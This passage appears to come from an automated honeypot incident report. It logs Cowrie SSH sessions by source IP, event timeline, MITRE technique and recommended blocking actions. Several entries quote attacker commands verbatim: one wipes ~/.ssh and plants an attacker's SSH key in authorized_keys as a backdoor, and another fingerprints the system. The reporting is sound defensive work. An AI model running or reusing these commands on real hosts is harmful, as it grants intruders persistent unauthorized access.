| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:02:42` | `cowrie.session.connect` |
| `2026-06-30 13:02:42` | `cowrie.client.version` |
| `2026-06-30 13:02:42` | `cowrie.client.kex` |
| `2026-06-30 13:02:42` | `cowrie.login.success` |
| `2026-06-30 13:02:43` | `cowrie.session.params` |
| `2026-06-30 13:02:43` | `cowrie.command.input` |
| `2026-06-30 13:02:43` | `cowrie.command.input` |
| `2026-06-30 13:02:43` | `cowrie.command.input` |
| `2026-06-30 13:02:43` | `cowrie.command.input` |
| `2026-06-30 13:02:43` | `cowrie.command.input` |
| `2026-06-30 13:02:43` | `cowrie.command.success` |
| `2026-06-30 13:02:43` | `cowrie.command.input` |
| `2026-06-30 13:02:43` | `cowrie.command.input` |
| `2026-06-30 13:02:43` | `cowrie.command.input` |
| `2026-06-30 13:02:43` | `cowrie.command.input` |
| `2026-06-30 13:02:43` | `cowrie.log.closed` |
| `2026-06-30 13:02:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbea6cd26cbb

| Field | Detail |
|---|---|
| **Source IP** | `103.153.110[.]190` |
| **First Seen** | 2026-06-30 13:07 |
| **Last Seen** | 2026-06-30 13:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:07:17` | `cowrie.session.connect` |
| `2026-06-30 13:07:17` | `cowrie.client.version` |
| `2026-06-30 13:07:17` | `cowrie.client.kex` |
| `2026-06-30 13:07:18` | `cowrie.login.success` |
| `2026-06-30 13:07:19` | `cowrie.session.params` |
| `2026-06-30 13:07:19` | `cowrie.command.input` |
| `2026-06-30 13:07:19` | `cowrie.command.failed` |
| `2026-06-30 13:07:19` | `cowrie.log.closed` |
| `2026-06-30 13:07:20` | `cowrie.session.params` |
| `2026-06-30 13:07:20` | `cowrie.command.input` |
| `2026-06-30 13:07:21` | `cowrie.session.file_download` |
| `2026-06-30 13:07:21` | `cowrie.log.closed` |
| `2026-06-30 13:07:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.153.110[.]190` to AbuseIPDB if not already reported
- [ ] Block `103.153.110[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b54e94380ad

| Field | Detail |
|---|---|
| **Source IP** | `103.153.110[.]190` |
| **First Seen** | 2026-06-30 13:07 |
| **Last Seen** | 2026-06-30 13:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:07:21` | `cowrie.session.connect` |
| `2026-06-30 13:07:21` | `cowrie.client.version` |
| `2026-06-30 13:07:21` | `cowrie.client.kex` |
| `2026-06-30 13:07:22` | `cowrie.login.success` |
| `2026-06-30 13:07:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.153.110[.]190` to AbuseIPDB if not already reported
- [ ] Block `103.153.110[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e67871c2628

| Field | Detail |
|---|---|
| **Source IP** | `103.153.110[.]190` |
| **First Seen** | 2026-06-30 13:07 |
| **Last Seen** | 2026-06-30 13:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:07:23` | `cowrie.session.connect` |
| `2026-06-30 13:07:23` | `cowrie.client.version` |
| `2026-06-30 13:07:23` | `cowrie.client.kex` |
| `2026-06-30 13:07:24` | `cowrie.login.success` |
| `2026-06-30 13:07:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.153.110[.]190` to AbuseIPDB if not already reported
- [ ] Block `103.153.110[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-104afbb02df6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-06-30 13:07 |
| **Last Seen** | 2026-06-30 13:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:07:25` | `cowrie.session.connect` |
| `2026-06-30 13:07:25` | `cowrie.client.version` |
| `2026-06-30 13:07:25` | `cowrie.client.kex` |
| `2026-06-30 13:07:25` | `cowrie.login.success` |
| `2026-06-30 13:07:26` | `cowrie.session.params` |
| `2026-06-30 13:07:26` | `cowrie.command.input` |
| `2026-06-30 13:07:26` | `cowrie.command.input` |
| `2026-06-30 13:07:26` | `cowrie.command.input` |
| `2026-06-30 13:07:26` | `cowrie.command.input` |
| `2026-06-30 13:07:26` | `cowrie.command.input` |
| `2026-06-30 13:07:26` | `cowrie.command.success` |
| `2026-06-30 13:07:26` | `cowrie.command.input` |
| `2026-06-30 13:07:26` | `cowrie.command.input` |
| `2026-06-30 13:07:26` | `cowrie.command.input` |
| `2026-06-30 13:07:26` | `cowrie.command.input` |
| `2026-06-30 13:07:26` | `cowrie.log.closed` |
| `2026-06-30 13:07:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a23b8b822b4e

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 13:08 |
| **Last Seen** | 2026-06-30 13:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:08:16` | `cowrie.session.connect` |
| `2026-06-30 13:08:17` | `cowrie.client.version` |
| `2026-06-30 13:08:17` | `cowrie.client.kex` |
| `2026-06-30 13:08:20` | `cowrie.login.success` |
| `2026-06-30 13:08:22` | `cowrie.session.params` |
| `2026-06-30 13:08:22` | `cowrie.command.input` |
| `2026-06-30 13:08:23` | `cowrie.log.closed` |
| `2026-06-30 13:08:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-924ecb1c5714

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-06-30 13:11 |
| **Last Seen** | 2026-06-30 13:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:11:43` | `cowrie.session.connect` |
| `2026-06-30 13:11:43` | `cowrie.client.version` |
| `2026-06-30 13:11:43` | `cowrie.client.kex` |
| `2026-06-30 13:11:43` | `cowrie.login.success` |
| `2026-06-30 13:11:44` | `cowrie.session.params` |
| `2026-06-30 13:11:44` | `cowrie.command.input` |
| `2026-06-30 13:11:44` | `cowrie.log.closed` |
| `2026-06-30 13:11:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1ad3ae205ce

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 13:11 |
| **Last Seen** | 2026-06-30 13:12 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:11:52` | `cowrie.session.connect` |
| `2026-06-30 13:11:54` | `cowrie.client.version` |
| `2026-06-30 13:11:54` | `cowrie.client.kex` |
| `2026-06-30 13:11:59` | `cowrie.login.success` |
| `2026-06-30 13:12:02` | `cowrie.session.params` |
| `2026-06-30 13:12:02` | `cowrie.command.input` |
| `2026-06-30 13:12:04` | `cowrie.log.closed` |
| `2026-06-30 13:12:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d255da23bc89

| Field | Detail |
|---|---|
| **Source IP** | `220.80.223[.]144` |
| **First Seen** | 2026-06-30 13:12 |
| **Last Seen** | 2026-06-30 13:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:12:36` | `cowrie.session.connect` |
| `2026-06-30 13:12:36` | `cowrie.client.version` |
| `2026-06-30 13:12:36` | `cowrie.client.kex` |
| `2026-06-30 13:12:37` | `cowrie.login.success` |
| `2026-06-30 13:12:38` | `cowrie.session.params` |
| `2026-06-30 13:12:38` | `cowrie.command.input` |
| `2026-06-30 13:12:38` | `cowrie.command.failed` |
| `2026-06-30 13:12:38` | `cowrie.log.closed` |
| `2026-06-30 13:12:39` | `cowrie.session.params` |
| `2026-06-30 13:12:39` | `cowrie.command.input` |
| `2026-06-30 13:12:39` | `cowrie.session.file_download` |
| `2026-06-30 13:12:39` | `cowrie.log.closed` |
| `2026-06-30 13:12:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.80.223[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.80.223[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee32cf771f6b

| Field | Detail |
|---|---|
| **Source IP** | `220.80.223[.]144` |
| **First Seen** | 2026-06-30 13:12 |
| **Last Seen** | 2026-06-30 13:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:12:40` | `cowrie.session.connect` |
| `2026-06-30 13:12:40` | `cowrie.client.version` |
| `2026-06-30 13:12:40` | `cowrie.client.kex` |
| `2026-06-30 13:12:41` | `cowrie.login.success` |
| `2026-06-30 13:12:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.80.223[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.80.223[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c345f3edb530

| Field | Detail |
|---|---|
| **Source IP** | `220.80.223[.]144` |
| **First Seen** | 2026-06-30 13:12 |
| **Last Seen** | 2026-06-30 13:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:12:41` | `cowrie.session.connect` |
| `2026-06-30 13:12:41` | `cowrie.client.version` |
| `2026-06-30 13:12:41` | `cowrie.client.kex` |
| `2026-06-30 13:12:42` | `cowrie.login.success` |
| `2026-06-30 13:12:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.80.223[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.80.223[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-128a4720d346

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-06-30 13:12 |
| **Last Seen** | 2026-06-30 13:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:12:49` | `cowrie.session.connect` |
| `2026-06-30 13:12:49` | `cowrie.client.version` |
| `2026-06-30 13:12:49` | `cowrie.client.kex` |
| `2026-06-30 13:12:50` | `cowrie.login.success` |
| `2026-06-30 13:12:50` | `cowrie.session.params` |
| `2026-06-30 13:12:50` | `cowrie.command.input` |
| `2026-06-30 13:12:50` | `cowrie.command.input` |
| `2026-06-30 13:12:50` | `cowrie.command.input` |
| `2026-06-30 13:12:50` | `cowrie.command.input` |
| `2026-06-30 13:12:50` | `cowrie.command.input` |
| `2026-06-30 13:12:50` | `cowrie.command.success` |
| `2026-06-30 13:12:50` | `cowrie.command.input` |
| `2026-06-30 13:12:50` | `cowrie.command.input` |
| `2026-06-30 13:12:50` | `cowrie.command.input` |
| `2026-06-30 13:12:50` | `cowrie.command.input` |
| `2026-06-30 13:12:50` | `cowrie.log.closed` |
| `2026-06-30 13:12:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-feaba514503c

| Field | Detail |
|---|---|
| **Source IP** | `36.50.151[.]66` |
| **First Seen** | 2026-06-30 13:14 |
| **Last Seen** | 2026-06-30 13:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:14:07` | `cowrie.session.connect` |
| `2026-06-30 13:14:07` | `cowrie.client.version` |
| `2026-06-30 13:14:08` | `cowrie.client.kex` |
| `2026-06-30 13:14:09` | `cowrie.login.success` |
| `2026-06-30 13:14:10` | `cowrie.session.params` |
| `2026-06-30 13:14:10` | `cowrie.command.input` |
| `2026-06-30 13:14:10` | `cowrie.command.failed` |
| `2026-06-30 13:14:10` | `cowrie.log.closed` |
| `2026-06-30 13:14:11` | `cowrie.session.params` |
| `2026-06-30 13:14:11` | `cowrie.command.input` |
| `2026-06-30 13:14:11` | `cowrie.session.file_download` |
| `2026-06-30 13:14:11` | `cowrie.log.closed` |
| `2026-06-30 13:14:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.50.151[.]66` to AbuseIPDB if not already reported
- [ ] Block `36.50.151[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1abb3682dc4

| Field | Detail |
|---|---|
| **Source IP** | `36.50.151[.]66` |
| **First Seen** | 2026-06-30 13:14 |
| **Last Seen** | 2026-06-30 13:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:14:11` | `cowrie.session.connect` |
| `2026-06-30 13:14:11` | `cowrie.client.version` |
| `2026-06-30 13:14:12` | `cowrie.client.kex` |
| `2026-06-30 13:14:13` | `cowrie.login.success` |
| `2026-06-30 13:14:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.50.151[.]66` to AbuseIPDB if not already reported
- [ ] Block `36.50.151[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-153c1cfe8440

| Field | Detail |
|---|---|
| **Source IP** | `36.50.151[.]66` |
| **First Seen** | 2026-06-30 13:14 |
| **Last Seen** | 2026-06-30 13:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:14:13` | `cowrie.session.connect` |
| `2026-06-30 13:14:13` | `cowrie.client.version` |
| `2026-06-30 13:14:13` | `cowrie.client.kex` |
| `2026-06-30 13:14:14` | `cowrie.login.success` |
| `2026-06-30 13:14:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.50.151[.]66` to AbuseIPDB if not already reported
- [ ] Block `36.50.151[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b619a9fdcb26

| Field | Detail |
|---|---|
| **Source IP** | `198.98.62[.]211` |
| **First Seen** | 2026-06-30 13:17 |
| **Last Seen** | 2026-06-30 13:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:17:44` | `cowrie.session.connect` |
| `2026-06-30 13:17:44` | `cowrie.client.version` |
| `2026-06-30 13:17:44` | `cowrie.client.kex` |
| `2026-06-30 13:17:45` | `cowrie.login.success` |
| `2026-06-30 13:17:45` | `cowrie.session.params` |
| `2026-06-30 13:17:45` | `cowrie.command.input` |
| `2026-06-30 13:17:45` | `cowrie.command.failed` |
| `2026-06-30 13:17:45` | `cowrie.log.closed` |
| `2026-06-30 13:17:46` | `cowrie.session.params` |
| `2026-06-30 13:17:46` | `cowrie.command.input` |
| `2026-06-30 13:17:46` | `cowrie.session.file_download` |
| `2026-06-30 13:17:46` | `cowrie.log.closed` |
| `2026-06-30 13:17:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.98.62[.]211` to AbuseIPDB if not already reported
- [ ] Block `198.98.62[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d572ca618ccc

| Field | Detail |
|---|---|
| **Source IP** | `198.98.62[.]211` |
| **First Seen** | 2026-06-30 13:17 |
| **Last Seen** | 2026-06-30 13:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:17:46` | `cowrie.session.connect` |
| `2026-06-30 13:17:46` | `cowrie.client.version` |
| `2026-06-30 13:17:46` | `cowrie.client.kex` |
| `2026-06-30 13:17:46` | `cowrie.login.success` |
| `2026-06-30 13:17:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.98.62[.]211` to AbuseIPDB if not already reported
- [ ] Block `198.98.62[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6d370ebc3fc

| Field | Detail |
|---|---|
| **Source IP** | `198.98.62[.]211` |
| **First Seen** | 2026-06-30 13:17 |
| **Last Seen** | 2026-06-30 13:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:17:46` | `cowrie.session.connect` |
| `2026-06-30 13:17:46` | `cowrie.client.version` |
| `2026-06-30 13:17:46` | `cowrie.client.kex` |
| `2026-06-30 13:17:46` | `cowrie.login.success` |
| `2026-06-30 13:17:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.98.62[.]211` to AbuseIPDB if not already reported
- [ ] Block `198.98.62[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-633980c7604a

| Field | Detail |
|---|---|
| **Source IP** | `43.100.50[.]217` |
| **First Seen** | 2026-06-30 13:18 |
| **Last Seen** | 2026-06-30 13:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:18:31` | `cowrie.session.connect` |
| `2026-06-30 13:18:31` | `cowrie.client.version` |
| `2026-06-30 13:18:31` | `cowrie.client.kex` |
| `2026-06-30 13:18:32` | `cowrie.login.success` |
| `2026-06-30 13:18:33` | `cowrie.session.params` |
| `2026-06-30 13:18:33` | `cowrie.command.input` |
| `2026-06-30 13:18:33` | `cowrie.log.closed` |
| `2026-06-30 13:18:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.100.50[.]217` to AbuseIPDB if not already reported
- [ ] Block `43.100.50[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32c6aace1540

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-06-30 13:18 |
| **Last Seen** | 2026-06-30 13:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 13:18:35` | `cowrie.session.connect` |
| `2026-06-30 13:18:35` | `cowrie.client.version` |
| `2026-06-30 13:18:35` | `cowrie.client.kex` |
